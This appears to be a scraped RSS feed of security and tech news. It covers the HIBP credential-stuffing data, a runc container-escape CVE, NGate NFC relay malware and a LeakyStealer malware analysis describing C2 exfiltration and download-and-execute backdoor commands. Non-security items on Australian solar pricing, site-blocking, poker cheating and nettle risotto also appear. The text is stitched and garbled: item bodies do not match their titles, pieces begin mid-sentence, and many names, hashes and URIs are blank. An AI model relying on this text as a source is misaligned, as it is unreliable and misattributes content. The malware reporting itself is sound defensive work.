post:Use the Pwned Passwords search page. Passwords are protected with an anonymity model, so we never see them (it's processed in the browser itself), but if you're wary, just check old ones you may suspect.Use the k-anonymity API. This is what drives the page in the previous point, and if you're handy with writing code, this is an easy approach and gives you complete confidence in the anonymity aspect.Use 1Password's Watchtower. The password manager has a built-in checker that uses the abovementioned API and can check all the passwords in your vault. (Disclosure: 1Password is a regular sponsor of this blog, and has product placement on HIBP.)It pains me to say it, but I have to, given the way the stealer logs made ridiculous, completely false headlines a couple of weeks ago:There are 32 different email domains in this latest corpus, of which gmail.com is one. It is, of course, the largest and has 394 million unique email addresses on it. In other words, 80% of the data in this corpus has absolutely nothing to do with Gmail, and the 20% of Gmail addresses have absolutely nothing to do with any sort of security vulnerability on Google's behalf. There - now let reporting sanity prevail!I wanted to add this just to highlight how painful it has been to deal with this data. This corpus is nearly 3 times the size of the previous largest breach we'd loaded, and HIBP is  times larger than it was in 2019 when we loaded the Collection #1 data. Taking 2 billion records and adding the ones we hadn't already seen in the existing 15 billion corpus, whilst not adversely impacting the live system serving millions of visitors a day, was  non-trivial. Managing the nuances of SQL Server indexes such that we could optimise both inserts and queries is not my idea of fun, and it's been a pretty hard couple of weeks if I'm honest. It's also been a very expensive period as we turned the cloud up to 11 (we run on Azure SQL Hyperscale, which we maxed out at 80 cores for almost two weeks).A simple example of the challenge is that after loading all the email addresses up into a staging table, we needed to create SHA1 hashes of each. Normally, that would involve something to the effect of "update table set column = sha1(email)" and you're done. That crashed completely, so we ended up doing "insert into new table select email, sha1(email)". But on other occasions the breach load required us to do updates on other columns (with no hash creation), which, on mulitple occasions, we had to kill after a day or more of execution with no end in sight. So, we ended up batching in loops (usually 1M records at a time), reporting on progress along the way so we had some idea of when it would actually finish. It was a painful process of trail, waiting ages, error then taking a completely different approach.Notifying our subscribers is another problem. We have 5.9 million of them, and 2.9 million are in this data 🫨 Simply sending that many emails at once is hard. It's not so much hard in terms of firing them off, rather it's hard in terms of not ending up on a reputation naughty list or having mail throttled by the receiving server. That's happened many times in the past when loading large, albeit much smaller corpuses; Gmail, for example, suddenly sees a massive spike and slows down the delivery to inboxes. Not such a biggy for sending breach notices, but a major problem for people trying to sign into their dashboard who can no longer receive the email with the "magic" link.What we've done to address that for this incident is to slow down the delivery of emails for the individual breach notification. Whilst I'd originally intended to send the emails at a constant rate over the period of a week, someone listening to me on my Friday live stream had a much better suggestion:the strategy I've found to best work with large email delivery is to look at the average number of emails you've sent over the last 30 days each time you want to ramp up, and then increase that volume by around 50% per day until you've worked your way through the queueWhich makes a lot of sense, and stacked up as I did more research (thanks Joe!). So, here's what our planned delivery schedule now looks like:That's broken down by hour, increasing in volume by 1.015 times per hour, such that the emails are spread out in a similar, gradually increasing cadence. On a daily basis, that works out at a 45% increase in each 24-hour period, within Joe's suggested 50% threshold. Plus, we obviously have all the other mechanisms such as a dedicated IP, properly configured DKIM, DMARC and SPF, only emailing double-opted-in subscribers and spam-friendly message body construction. So, it could be days before you receive a notification, or just run a haveibeenpwned.com search on demand if you're impatient.We've sent all the domain notification emails instantly because, by definition, they're going to a very wide range of different mail servers; it's just the individual ones we're drop-feeding.Lastly, if you've integrated Pwned Passwords into your service, you'll now see noticeably larger response sizes. The numbers I mentioned in the opening paragraph increase the size of each hash range by an average of about 50%, which will push responses from about 26kb to 40kb. That's when brotli compressed, so obviously, make sure you're making requests that make the most of the compression.This data is now searchable in HIBP as the Synthient Credential Stuffing Threat Data. It's an entirely separate corpus from that previous Synthient data I mentioned earlier; they're discrete datasets with some crossover, but obviously, this one is significantly larger. And, of course, all the passwords are now searchable per the Pwned Passwords guidance above.If I could close with one request: this was an extremely laborious, time-consuming and expensive exercise for us to complete. We've done our best to verify the integrity of the data and make it searchable in a practical way while remaining as privacy-centric as possible. Sending as many notifications as we have will inevitably lead to a barrage of responses from people wanting access to complete rows of data, grilling us on precisely where it was obtained from or, believe it or not, outright abusing us. Not doing those things would be awesome, and I suggest instead putting the energy into getting a password manager, making passwords strong and unique (or even better, using passkeys where available), and turning on multi-factor auth. That would be an awesome outcome for all 😊]]></content:encoded></item><item><title>CVE-2025-52565 - container escape due to /dev/console mount and related races</title><link>https://cvefeed.io/vuln/detail/CVE-2025-52565</link><author></author><category>vulns</category><pubDate>Thu, 6 Nov 2025 20:15:49 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-52565

runc is a CLI tool for spawning and running containers according to the OCI specification. Versions 1.0.0-rc3 through 1.2.7, 1.3.0-rc.1 through 1.3.2, and 1.4.0-rc.1 through 1.4.0-rc.2, due to insufficient checks when bind-mounting `/dev/pts/$n` to `/dev/console` inside the container, an attacker can trick runc into bind-mounting paths which would normally be made read-only or be masked onto a path that the attacker can write to. This attack is very similar in concept and application to CVE-2025-31133, except that it attacks a similar vulnerability in a different target (namely, the bind-mount of `/dev/pts/$n` to `/dev/console` as configured for all containers that allocate a console). This happens after `pivot_root(2)`, so this cannot be used to write to host files directly -- however, as with CVE-2025-31133, this can load to denial of service of the host or a container breakout by providing the attacker with a writable copy of `/proc/sysrq-trigger` or `/proc/sys/kernel/core_pattern` (respectively). This issue is fixed in versions 1.2.8, 1.3.3 and 1.4.0-rc.3.

The most targeted commodities are food and beverage products.”Although the cyberattacks were mostly seen in North America, cargo theft is a problem across the world, impacting consumers and businesses that rely on the often-overlooked network of trucks, trains, ships, planes, and people.In these attacks, cybercriminals compromise the accounts of carrier companies that transport goods from one location to the next. By posing as legitimate carriers, they can place real bids on shipments and then redirect them to unauthorized destinations, where they or their partners will receive and steal the cargo.Researchers found that attackers take control of these accounts in at least one of three ways.Attackers may post a fake order on what’s called a “load board,” a digital marketplace that connects shippers with carriers so that cargo can be assigned and accepted. But when legitimate carriers inquire about the fake load board posting, the criminals reply with an email that includes a malicious link that, when clicked, installs Remote Monitoring and Management (RMM) software. (To make the scam more convincing, the cybercriminals also compromise a “broker” account so their load board posting looks legitimate.)Despite the sneaky install method, RMM software itself is entirely legitimate. It’s used by IT support teams to remotely fix issues for employees. But that legitimacy makes RMM software perfect for any cybercriminal campaign because it may raise fewer red flags from older antivirus tools.Once the attackers gain access to a carrier’s account, they can also deploy malware to steal account credentials, giving them greater access to a company’s network.2. Compromised email accountsA second observed attack method involved hijacking an active email address and then impersonating the owner when responding to emails about cargo orders and shipments. Here, too, cybercriminals inserted malicious links into emails that eventually install RMM tools.Finally, researchers also observed the attackers sending direct phishing emails to carriers, using classic social engineering tricks—like sending a bogus bill to lure victims into clicking malicious links. While many of the well-tested security best practices still apply—like not clicking on links inside emails—one of the strongest defenses is to use a security product that notifies users about RMM tools (also sometimes referred to as Remote Desktop Programs) installed on their device. RMM tools are legitimate, but because of their abuses in cybercriminal campaigns, it is important that every installation is verified and tracked.We don’t just report on threats—we remove them]]></content:encoded></item><item><title>How a ransomware gang encrypted Nevada government&apos;s systems</title><link>https://www.bleepingcomputer.com/news/security/how-a-ransomware-gang-encrypted-nevada-governments-systems/</link><author>Bill Toulas</author><category>security</category><pubDate>Thu, 6 Nov 2025 19:02:16 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[The State of Nevada has completed its recovery from a ransomware attack it suffered on August 24, 2025, which impacted 60 state agencies, disrupting critical services related to health and public safety.

            Het Internationaal Strafhof (International Criminal Court, ICC) ruilt Microsoft 365 in voor Open Desk, een Europees open source alternatief. Dat schrijft de Duitse krant Handelsblatt. De krant verwacht dat het ICC met de overstap mogelijk een trend start binnen de Europese publieke sector.
            
            Microsoft bevestigt de breuk aan de nieuwssite Euractiv. ‘Wij hechten waarde aan onze relatie met het ICC als klant en zijn ervan overtuigd dat niets ons vermogen in de weg staat om in de toekomst diensten aan het ICC te blijven leveren,’ zegt een woordvoerder van Microsoft.

            Digitale afhankelijkheid﻿
            
            Bij Europese overheden leven al langer zorgen over de digitale afhankelijkheid van Amerikaanse bedrijven. Die zorgen zijn sterk toegenomen sinds Donald Trump voor de tweede maal president van de Verenigde Staten werd.
            
            Voor het ICC zijn de zorgen minder hypothetisch dan voor veel andere instituten: Trump heeft zijn ongenoegen met het Strafhof vaak laten blijken en liet sancties opstellen tegen de hoofdaanklager, Karim Khan. Persbureau AP meldde in mei 2025 dat Khan geen toegang meer had tot zijn Outlook e-mail. Microsoft bevestigde dat Khan was ‘losgekoppeld’ van Microsoft-diensten, maar benadrukte tegelijkertijd dat het de dienstverlening aan de ICC-organisatie ‘geen moment’ heeft stopgezet.

            Hoe dan ook zit de angst er bij het ICC goed in. De organisatie gaat gebruikmaken van Open Desk, dat is ontwikkeld door het Zentrum Digitale Souveränität (Zendis) in opdracht van het Duitse Federale ministerie van Binnenlandse Zaken. Zendis maakt onderdeel uit van het Digital Commons European Digital Infrastructure Consortium (DC-EDIC), het Europese consortium waarmee de EU strijdt voor meer digitale autonomie.
            
            Ook Nederlandse ambtenaren krijgen in de toekomst mogelijk te maken met de software van Open Desk. Onder de noemer Mijn Bureau experimenteert de Nederlandse overheid met een suite met verschillende Europese open source samenwerkingssoftware. Open Desk wordt binnen Mijn Bureau onder meer gebruikt voor e-mail. Mijn Bureau is een samenwerking van de Rijksoverheid, Gemeente Amsterdam en de VNG. 
            
            In een vandaag verschenen position paper pleit de VNG voor meer regie op technologie. Er wordt steeds meer toegewerkt naar verregaande samenwerking op het gebied van digitalisering. ln de Nederlandse Digitaliseringsstrategie (NDS) is het versterken van digitale weerbaarheid en autonomie één van de prioriteiten.

So, instead of stealing your bank card, the attackers capture NFC (Near Field Communication) activity on a mobile phone infected with the NGate malware and forward that transaction data to devices at ATMs. In NGate’s case the stolen data is sent over the network to the attackers’ servers rather than being relayed purely by radio.NFC comes in a few “flavors.” Some produce a static code—for example, the card that opens my apartment building door. That kind of signal can easily be copied to a device like my “Flipper Zero” so I can use that to open the door. But sophisticated contactless payment cards (like your Visa or Mastercard debit and credit cards) use dynamic codes. Each time you use the NFC, your card’s chip generates a unique, one-time code (often called a cryptogram or token) that cannot be reused and is different every time.So, that’s what makes the NGate malware more sophisticated. It doesn’t simply grab a signal from your card. The phone must be infected, and the victim must be tricked into performing a tap-to-pay or card-verification action and entering their PIN. When that happens, the app captures all the necessary NFC transaction data exchanged — not just the card number, but the fresh one-time codes and other details generated in that moment.The malware then instantly sends all that NFC data, including the PIN, to the attacker’s device. Because the codes are freshly generated and valid only for a short time, the attacker uses them immediately to imitate your card at an ATM; the accomplice at the ATM presents the captured data using a card-emulating device such as a phone, smartwatch, or custom hardware.But, as you can imagine, being ready at an ATM when the data comes in takes planning—and social engineering.First, attackers need to plant the malware on the victim’s device. Typically, they send phishing emails or SMS messages to potential victims. These often claim there is a security or technical issue with their bank account, trying to induce worry or urgency. Sometimes, they follow up with a phone call, pretending to be from the bank. These messages or calls direct victims to download a fake “banking” app from a non-official source, such as a direct link instead of Google Play.Once installed, the app app asks for permissions and leads victims through fake “card verification” steps. The goal is to get victims to act quickly and trustingly—while an accomplice waits at an ATM to cash out.NGate only works if your phone is infected and you’re tricked into initiating a tap-to-pay action on the fake banking app and entering your PIN. So the best way to stay safe from this malware is keep your phone protected and stay vigilant to social engineering:Stick to trusted sources. Download apps only from Google Play, Apple’s App Store, or the official provider. Your bank will never ask you to use another source. Use an up-to-date real-time anti-malware solution like Malwarebytes for Android, which already detects this malware.Do not engage with unsolicited callers. If someone claims to be from your bank, tell them you’ll call them back at the number you have on file.Malwarebytes for Android detects these banking Trojans as Android/Trojan.Spy.NGate.C; Android/Trojan.Agent.SIB01022b454eH140; Android/Trojan.Agent.SIB01c84b1237H62; Android/Trojan.Spy.Generic.AUR9552b53bH2756 and Android/Trojan.Banker.AURf26adb59C19.We don’t just report on phone security—we provide it]]></content:encoded></item><item><title>Take control of your privacy with updates on Malwarebytes for Windows</title><link>https://www.malwarebytes.com/blog/privacy/2025/11/take-control-of-your-privacy-with-updates-on-malwarebytes-for-windows</link><author></author><category>threatintel</category><pubDate>Thu, 6 Nov 2025 16:40:02 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[It’s getting harder to keep your Windows space truly yours, as Microsoft increasingly serves annoying ads and tracks your data across third-party apps.Pushing back against your eroding privacy has been a scattered and sometimes complicated process… but we’re making it easier for you.

Archive.today has built up a user base over a period of more than ten years who use the service to access previous snapshots of a web page. So basically like the Wayback Machine of the Internet Archive, only largely free of rules and presumably therefore also anonymous. To the chagrin of the media industry, the service is also often used to bypass paywalls. This is also possible because the service does not adhere to common rules and laws and offers no opt-out option.And so far, the operators have gotten away with it. Although there have been minor problems in the history of the service occasionally, for example, a top-level domain operator denied them further use of one of the many archive domains. However, the operation of the project, which is allegedly financed by donations and own funds, was not seriously endangered.But now the operators of archive.today are apparently fearing bigger trouble. In recent months and years, they had become noticeably quieter. Until two years ago, for example, questions were regularly answered in the blog. In the official X account, which had been silent for over a year, a new post appeared at the end of October new post. “Canary,” it said there, along with a URL. The mentioned canary bird is likely an allusion to an old custom in mining. A canary brought along warned the miners when it keeled over dead about the threat of invisible gas.The deadly danger that the site operators fear is apparently linked to the PDF linked in the X post linked PDF. It contains a court order that the US investigative authority FBI has obtained. It instructs the Canadian provider Tucows to hand over comprehensive data about the customer behind archive.today. It concerns address and connection data as well as payment information. If Tucows does not provide the data, penalties are threatened. Whether the court order is genuine and how the operators of the site obtained it could not be verified so far.Is the operator based in Russia?Why the FBI is currently interested in archive.today, which is also accessible under the domains archive.is and archive.ph, is not evident from the court order. However, there are several obvious starting points for investigations: in addition to the obvious reason of copyright issues, the investigators could also be pursuing suspicions about unclear financing, the origin of the operators, or the technical approach.In 2023, Finnish blogger Janni Patokallio compiled various clues and research results in a post in a post. According to this, Archive.today uses a botnet with changing IP addresses to circumvent anti-scraping measures. There are also indications that the operator(s) are based in Russia. Another private investigation from 2024 comes to a different conclusion. It names a software developer from New York as the alleged operator.

The duo performs reconnaissance on an infected machine and targets multiple crypto wallets, including browser extensions corresponding to crypto wallets. The malware also looks for browser history files from  and .The first stage (LeakyInjector) decrypts the -encrypted second stage  (LeakyStealer) and injects the payload into the explorer.exe process. The stealer computes the Bot ID corresponding to the infected machine and establishes persistence using an entry under the Run registry key. The malware implements a polymorphic engine that modifies memory bytes using specific hard-coded values. LeakyStealer searches for crypto wallets such as , and  in addition to browser extensions like , and . Two backdoor commands are implemented: downloading and executing a file, and executing Windows commands. A Hybrid Analysis PerspectiveThe sample is a 64-bit Windows executable (approximately 30 MB, padded with null bytes) and is signed with a valid digital certificate. The malware contains numerous debug strings and artifacts, indicating minimal obfuscation.The malware establishes persistence by creating an entry under the Run registry key:Figure 2 - Persistence through registry manipulationLooking at the “HTTP Traffic” in the Hybrid Analysis report, we can identify HTTP POST requests used for C2 communications. The domain was recently registered. The process connects to  on port 443 (TCP), using a browser-related user agent.Figure 3 - HTTP POST requests to the C2 serverThe stealer is looking for different browser extensions corresponding to crypto wallets:Figure 4 - Crypto wallets are targetedThe malware reads browser-related files to retrieve the browser history, as highlighted in the figure below.Figure 5 - Accessing browser-related dataThe first stage - which we named LeakyInjector - is looking for the “explorer.exe” process on the host:Figure 6 - The injector searches for the explorer.exe processThe malware injects the next stage into the explorer process using the low level APIs displayed below.Figure 7 - Perform process injection using low level APIsThe stealer that we called LeakyStealer is stored in an encrypted form in the injector and is decrypted using the  algorithm, with the key and nonce being hard-coded.Figure 8 - ChaCha20 algorithm is used to decrypt the stealer before it’s being injectedThe malware computes the Bot ID of the infected host by XOR-ing the “” volume serial number with the  constant. If not available, the Bot ID is initialized using the  function.Figure 9 - Bot ID value is computedIt retrieves the hostname, the username, and the domain assigned to the local machine (see Figure 10).Figure 10 - Extract information that will be exfiltratedThe malicious process determines whether it’s running with admin privileges using the  API (0x14 = ):Figure 11 - Determine if the malware is running with admin privilegesThe binary connects to the everstead[.]group C2 server using a hard-coded user agent, as highlighted below.Figure 12 - First connection to the C2 serverA field called “” is initialized with the “” value. Figure 13 reveals the verbose output containing information extracted in previous steps.Figure 13 - Multiple debugging strings shownThe stealer copies itself as “” in the “%” directory. It establishes persistence by creating an entry called “” under the Run registry key:Figure 14 - Self-copy and persistenceLeakyStealer implements a “polymorphic engine” that is able to modify its memory area with hard-coded bytes at runtime:Figure 15 - Modify bytes using a routine called polymorphic engine at runtimeThe search is performed for the 8-byte marker “”. The process changes the memory protection of the first 16 bytes (including the marker) using  (0x40 = ). These 16 bytes are modified to a randomized sequence of “no-operation” assembly instructions, such as 0x90 for NOP, “” for , or “” for “”. The code that performs the patching is fairly common and frequently found in video game cheat engines. Its purpose in this sample remains unclear as it does not change any actual code and limits the patching to the marker bytes.Figure 16 - Replace the 16 bytes containing the hard-coded marker using different bytesThe binary enters a loop that builds a registration packet that will be sent to the C2 server (Figure 17).Figure 17 - LeakyStealer is beaconing to the C2 server at regular intervalsThe  and  methods are utilized to obtain the Windows version:Figure 18 - Retrieve the Windows OS versionThe registration packet contains the “” magic string, the Bot ID, 0x01 (value corresponding to a Registration packet), the admin flag, the traffic tag, the hostname, the username, the Windows domain, and the OS version:Figure 19 - Registration packet is constructedFigure 20 - Example of a registration packetLeakyStealer is looking for cryptocurrency wallets such as  and :Figure 21 - Multiple crypto wallets are targetedCryptocurrency browser extensions such as  and  are also targeted:Figure 22 - Crypto browser extensionsThe malware exfiltrates the registration packet to the “” URI. The server’s response is received and read using the  and  functions (Figure 23).Figure 23 - Server’s response is received and parsedThe binary extracts the history file from the following browsers: , and .Figure 24 - Obtain the history file from multiple browsersEvery history file found is copied to the temporary folder as “”, where “” is generated via a function call to . The malware reads these files in memory and deletes them afterward using the  API, as highlighted below.Figure 25 - Create copies of history files, read them, and then delete them afterwardsThe browser history is exfiltrated to the C2 server using the “” URI. We observe that the stealer adds the “” header in the request:Figure 26 - Browser history files are sent to the C2 serverFigure 27 - Example of exfiltrating the browsing history filesThe server’s response has the following structure: “”. The command type can be 0 (No command from the server), 1 (two commands implemented by the stealer), and >=2 (Unknown command type).Figure 28 - Specific packet structure is expected from the C2 serverThe first command is used to download and execute a file from the C2 server. It has the “d” structure.Figure 29 - Download command implemented by LeakyStealerAs we can see below, the process downloads the file from the C2 server, creates and populates the newly created file, and finally executes it using the  method.Figure 30 - Create new file mentioned in the commandFigure 31 - CreateProcessA API callThe second command can be used to run Windows commands on the infected machine and sends the output to the C2 server. The output is read using an anonymous pipe:Figure 32 - Execute Windows command on the infected hostMapping the infrastructureThe certificate’s issuer details point to a Hong Kong registrant. Similar versions of the stealer were signed with the same certificate. At the time of the analysis, the certificate was still valid, but at the time of publishing this report it has been revoked by its issuer.Figure 33 - Signed Certificate informationThe certificate thumbprint  revealed seven related samples, demonstrating that the threat actor reuses signing infrastructure across multiple payloads.This legitimate Extended Validation (EV) certificate may have been potentially obtained through fraudulent means or a compromised business entity may have potentially been abused for malware signing. The seven samples share consistent operational patterns:Persistence mechanisms across all variantsMasquerading as legitimate Microsoft Edge update componentsRecent activity with samples spanning October 1-9, 2025 A Shodan search for the IP address returns open ports 22, 80 and 443.Figure 34 - Shodan searchThere are two domains associated with the IP address, namely “” and “”.  Figure 35 - Shodan result for the IP addressThe MSI file called “” drops LeakyStealer with SHA256  that communicates with the same C2 server. The installer could be downloaded from the  domain, as highlighted below:Figure 36 - VirusTotal result shows the distribution site of the installerWe’ve identified a PowerShell script that is related to NetSupportRAT on the same domain:Figure 37 - PowerShell script related to NetSupportRAT was stored on the distribution domainLeakyStealer Through the Eyes of Hybrid AnalysisThe Hybrid Analysis report identifies multiple behavioral patterns and indicators that classify LeakyStealer as a new, information-stealing malware. For example, it highlights that the process targets crypto browser extensions and the history files across multiple browsers. Through in-depth technical analysis of LeakyStealer’s core functionality, we’re potentially offering insights enabling more effective detection and defense strategies.Hybrid Analysis is a powerful platform for identifying and analyzing malware, whether mundane or highly sophisticated.

These are referred to as “peak hours” and generally they happen in the early evening, when people get home from work, turn on the HVAC, cook dinner, do laundry and the like.But there are also certain times of day when more electricity is generated, and that’s particularly the case in places with high solar penetration. Solar obviously generates energy only during the day, and creates a peak of generation in the middle of the day, when most people are at work.There are ways to mitigate this – for example, with batteries, which Australia has also used a lot of (and is thinking about extending that to EV batteries too). Wind power also helps, since wind tends to pick up in the hours that solar is dropping off.But another way to mitigate it is through simple economics. Offer people lower prices in the hours that electricity is more abundant, and higher prices in hours where it isn’t. Then, people will tend to use electricity when they can – especially if they have shiftable loads like electric cars, laundry, pool pumps and such, which don’t need to be on at the same time every day (unlike HVAC, cooking, and lighting, for example).Most electricity providers will offer something like this, called a “time of use” plan. These plans differ in their rates and peak hours depending on your location and how the supply/demand curves work for electricity there (and have seen common use among electric car owners because of the outsized effect an EV has on home electricity use).On the utility side, though, the swings in price can be much more drastic. Wholesale prices for electricity can go up to multiple dollars per kilowatt-hour during times of extreme demand when the grid is stressed, and electricity prices can even go negative when there is little demand and lots of supply, particularly on an islanded grid like Australia (this also happens in Texas, where the grid is largely disconnected from the rest of the US). These swings are ironed out for the consumer, so things aren’t as spiky for us, but it can be quite a rollercoaster on the grid side.In Australia and other places with high solar penetration, these negative electricity prices often happen during the day. That’s when generation is the highest for solar panels, and household loads are typically low.Australia proposes letting everyone benefit from negative wholesale ratesSo, the Australian government has decided on a scheme to bring those electricity savings to the consumer, with what its calling its “Solar Sharer” program.The program would require electricity retailers to provide free electricity to everyone for at least three hours a day, in recognition of the incredibly low wholesale cost of electricity during daytime due to extensive solar power penetration.These would likely be in the middle of the day, when most people aren’t home. However, every home has some amount of shiftable electricity load, and the Solar Sharer scheme would encourage people to make use of that. With modern appliances that can be scheduled to start in the middle of the day, people can just plan to do laundry, run the dishwasher, run the pool pump, or charge their car at noon, instead of whenever else they were going to.Additionally, people could fill up a home battery during the day, and then use that electricity during peak hours when rates are higher. And this plan will help to incentivize private installation of batteries, or other shiftable loads.The overall effect of this is that it will help to iron out electricity use, making it track more closely with electricity supply, reducing the need for grid upgrades to manage swings in generation. Just turning on this simple behavioral switch, and then publicizing it so customers know to use electricity in the free hours, will both help the grid and help ratepayers save money.Better yet, this scheme will apply not just to people who have solar or home batteries, but to people who live in places where they can’t put up solar – those who live in apartments and the like. The government says it will require companies to offer this scheme to all customers, not just those with solar.The government did receive some pushback from electricity retailers, who feel they were not properly consulted on the plan. But Australia’s Climate Change Minister Chris Bowen said he would make “no apologies” if this scheme reduced their margins, and that “consumers are put first” as reported by the Australian Broadcasting Corporation.The government plans to implement the scheme starting in July next year, first in Queensland, New South Wales and South Australia. If it works well, other regions will get it starting in 2027.Australia is doing a lot of great things with electricity, and acting somewhat like a natural laboratory for a lot of ideas that people have been talking about for a long time. Since the whole country has similar solarization, it can work somewhat as a unit in pushing for solar power, and for reforms to help enable it.It’s already working on V2G, with a huge trial started recently, and the wide adoption of solar and batteries is proving that even a solar-heavy grid can still work. And an idea like this, showing how simple economics can be used to change consumer behavior, could provide a model for the rest of the world on how to usher us into a cleaner energy future.So we’ll be watching with interest how this turns out – I think it will likely turn out quite well, if the government goes through with it fully.The 30% federal solar tax credit is ending this year.

Every year, the office of the United States Trade Representative (USTR) publishes the National Trade Estimate Report on Foreign Trade Barriers.The report is compiled based on input from key industry players. This includes submissions from copyright industry groups that frequently highlight piracy challenges that in their view act as barriers to trade.In previous years, for example, the MPA and others have called for more site-blocking efforts to counter the piracy threat. Interestingly, however, other American companies now inform the USTR that foreign site-blocking measures are becoming a significant trade barrier. Cloudflare Sees Piracy Blockades as Trade BarriersTo share its concerns, Cloudflare decided to participate in the annual trade barriers consultation for the first time this year. The company describes itself as a “leading connectivity cloud company” running one of the world’s largest networks, providing security, performance, and reliability services.According to Cloudflare, several foreign countries disproportionately impact U.S. technology providers, with many concerns relating to site-blocking measures that aim to deter online piracy.Cloudflare writes that Spanish courts allow rightsholders to request “overbroad court orders” that authorize IP address blocking. Since a single IP address can serve thousands of domains, disrupting pirates often means that many legitimate sites and services are blocked too, causing widespread collateral damage.“This practice results in the widespread and repeated disruption of tens of thousands of unrelated, legitimate websites, as well as the disruption of digital services, with no judicial opportunity for remedy,” Cloudflare writes. “These actions, designed to protect a narrow set of commercial interests, have caused significant collateral harm to businesses and users who are not the intended targets, without recourse or the possibility for affected parties to challenge the underlying order.”The Spanish Government is aware of the problems, which Cloudflare says are at odds with international standards, but has chosen not to intervene in the issue. Therefore, it continues to present a significant trade barrier.Cloudflare reports similar concerns in Italy, where the “Piracy Shield” site-blocking law has a direct effect on American companies. This blocking regulation requires network providers, including CDNs, to comply with blocking notices within 30 minutes. “The failure to include adequate safeguards against collateral damage has led to the inappropriate blocking of shared services of large cloud providers, which are disproportionately American businesses,” Cloudflare notes. “For instance, the blocking of a Cloudflare IP address resulted in tens of thousands of non-targeted websites being blocked in February 2024. Furthermore, the blocking of the domain “drive.usercontent.google.com” in October denied Italian users access to Google Drive for over 12 hours.”Efforts to expand Piracy Shield to public DNS resolvers and VPN services only make the problem worse, Cloudflare says, noting that some U.S. companies have already decided to leave the European country.Automated piracy blocks are not the only reported trade barrier in Italy. Cloudflare also notes that the country allows rightsholders to “abuse” the courts to disrupt U.S. businesses by granting  blocking orders without giving the companies a chance to oppose them.“This coercive, penalty-based approach to removal of content, without adequate judicial review or due process protections, is a significant barrier to doing business in Italy,” Cloudflare writes.In France, Cloudflare highlights Article L.333-10 of the Sports Code as a key problem. This has resulted in several pirate site blocking orders that go beyond regular Internet providers, requiring DNS resolvers and VPN services to take action as well. Cloudflare notes that some services lack the technical capabilities to implement these orders and as a result, several U.S. companies have already left the country. Recently, France passed a new anti-piracy bill that opens the door to automated IP-address blocking, similar to Italy’s Piracy Shield. This is a major concern for Cloudflare, which fears that this will only lead to more collateral damage.“It increases the risk of overblocking legitimate content or mistakenly targeting websites that operate lawfully, potentially disrupting cross-border digital services,” Cloudflare writes. South Korea has also created trade barriers due to its site-blocking measures, Cloudflare reports. A revision to the Network Act in 2023 now requires “CDNs to restrict access to illegal content”.As a result, Cloudflare and other American companies are required to maintain detailed and regularly updated blocklists.“The South Korea Communication Commission (KCC) sends U.S. CDN providers a ‘block list’ of over 1.5 million URLs (with 30,000 new additions monthly),” Cloudflare writes, noting that this places an “unprecedented compliance burden” on companies. Conflicting Demands at the U.S. Trade OfficeCloudflare urges the USTR to take these concerns into account for its upcoming National Trade Estimate Report. Ideally, it wants these trade barriers to be dismantled.These calls run counter to requests from rightsholders, who urge the USTR to ensure that more foreign countries implement blocking measures. With potential site-blocking legislation being considered in U.S. Congress, that may impact local lobbying efforts as well. If and how the USTR will address these concerns will become clearer early next year, when the 2026 National Trade Estimate Report is expected to be published. A copy of Cloudflare’s submission for the USTR’s 2025 National Trade Estimate Report on Foreign Trade Barriers is available here (pdf)]]></content:encoded></item><item><title>Critical Cisco UCCX flaw lets attackers run commands as root</title><link>https://www.bleepingcomputer.com/news/security/critical-cisco-uccx-flaw-lets-hackers-run-commands-as-root/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Thu, 6 Nov 2025 13:31:10 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Cisco has released security updates to patch a critical vulnerability in the Unified Contact Center Express (UCCX) software, which could enable attackers to execute commands with root privileges.

As set forth in the indictment, the rigged games used altered shuffling machines that contained hidden technology allowing the machines to read all the cards in the deck.  Because the cards were always dealt in a particular order to the players at the table, the machines could determine which player would have the winning hand. This information was transmitted to an off-site member of the conspiracy, who then transmitted that information via cellphone back to a member of the conspiracy who was playing at the table, referred to as the “Quarterback” or “Driver.”  The Quarterback then secretly signaled this information (usually by prearranged signals like touching certain chips or other items on the table) to other co-conspirators playing at the table, who were also participants in the scheme.  Collectively, the Quarterback and other players in on the scheme (i.e., the cheating team) used this information to win poker games against unwitting victims, who sometimes lost tens or hundreds of thousands of dollars at a time. The defendants used other cheating technology as well, such as a chip tray analyzer (essentially, a poker chip tray that also secretly read all cards using hidden cameras), an x-ray table that could read cards face down on the table, and special contact lenses or eyeglasses that could read pre-marked cards. ]]></content:encoded></item><item><title>From Tabletop to Turnkey: Building Cyber Resilience in Financial Services</title><link>https://thehackernews.com/2025/11/from-tabletop-to-turnkey-building-cyber.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgiaJEM1FidoLhzNIrYBATCN7L9TeVdHj9VIprFLqsgTxUHm_iQChfyBlaCMZmoGonBSd1lHzUuVLOOY-tp25Ys8SdCPz_D86hBTHEOv_7LQijqkKpwRUr7AzQSlhL8KjqlKKZ1eYH-UBv6sAVfyFtyjisLixySCxpFvnHGJ6XaqWtc1EnB4_NkbnBxqTT5/s1600/lock.jpg" length="" type=""/><pubDate>Thu, 6 Nov 2025 11:59:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Introduction

Most people know that stinging nettles are pesky green plants that irritate the skin when you touch them. What you probably don’t know is that they’re a nutritious source of iron, calcium, potassium, and silica as well as vitamins A, B, C, and K1. Stinging nettles also have anti-inflammatory properties and can relieve arthritis and rheumatism. They can be turned into soups, curries, and risottos (some recipes here) and you can get them completely free from practically everywhere in Britain over the summer. You’ve likely even got some in your garden.When you collect them you need to wear gloves because they sting. The advantage of this is it allows you to make sure you’re collecting the right thing. If you’re unsure, just touch one and see whether it hurts which is exactly what I did. It hurt.The even look a bit scary with their toothy-edged leaves.Once you’ve got them inside, boil them in water for a few minutes and this will stop them stinging.We’re having stinging nettle risotto.People think that when you become vegan you have to give up lots of food. It’s true that I stopped eating animals but the number of different species I eat has grown considerably. This is because meat-eaters tend to eat the same few species of animals over and over again – pigs, cows, chickens. Whereas there are some 20,000 species of edible plants in the world. Meat also tends to fill you up. Indeed I’ve been to dinner with people where all they have on their plate is a slab of meat and nothing else. Whereas as 